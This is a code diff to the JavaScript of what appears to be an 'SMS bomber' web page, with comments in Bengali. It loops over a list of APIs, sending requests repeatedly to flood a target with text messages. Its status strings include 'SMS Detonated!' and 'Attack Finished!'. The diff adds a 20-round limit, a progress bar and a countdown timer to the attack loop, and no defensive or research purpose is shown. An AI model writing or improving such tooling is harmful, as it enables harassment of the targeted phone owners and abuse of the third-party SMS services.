@@ -329,19 +329,36 @@
       ];
 
       const messages = ["Boom Sent!", "Target Missed!", "Direct Hit!", "Boom Delivered!", "Reloading...", "Incoming Blast!", "SMS Detonated!"];
-      let successCount = 0;
+      // ২০টির লিমিট চেক
+    if (count > 20) {
+        responseMessage.innerHTML = '<span class="alert failure">Error: Maximum limit is 20!</span>';
+        responseMessage.style.color = "white";
+        return;
+    }
 
-      for (let i = 0; i < count; i++) {
+    // নতুন প্রগ্রেস এরিয়া দেখানো
+    document.getElementById('progressArea').style.display = 'block';
+    const progressBar = document.getElementById('progressBar');
+    const timerDisplay = document.getElementById('countdownTimer');
+    let successCount = 0;
+
+    for (let i = 0; i < count; i++) {
+        // টাইম কাউন্টডাউন আপডেট
+        timerDisplay.innerText = `Time Left: ${count - i}s`;
+        
         for (let api of apis) {
-          let result = await sendRequest(api.url, api.method, api.data);
-          let msg = messages[Math.floor(Math.random() * messages.length)];
-          logs.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg} ${result ? "✅" : "❌"}<br>`;
-          logs.scrollTop = logs.scrollHeight;
-          if (result) successCount++;
-          await delay(100);
+            let result = await sendRequest(api.url, api.method, api.data);
+            if (result) successCount++;
         }
-      }
 
+        // লাল প্রগ্রেস বার আপডেট
+        let progress = ((i + 1) / count) * 100;
+        progressBar.style.width = progress + '%';
+        
+        await delay(1000); 
+    }
+    timerDisplay.innerText = "Attack Finished!";
+      
       spinner.style.display = 'none';
       if (successCount > 0) {
         responseMessage.innerHTML = `<span class="alert success">Attack Complete! (${successCount} Hits)</span>`;
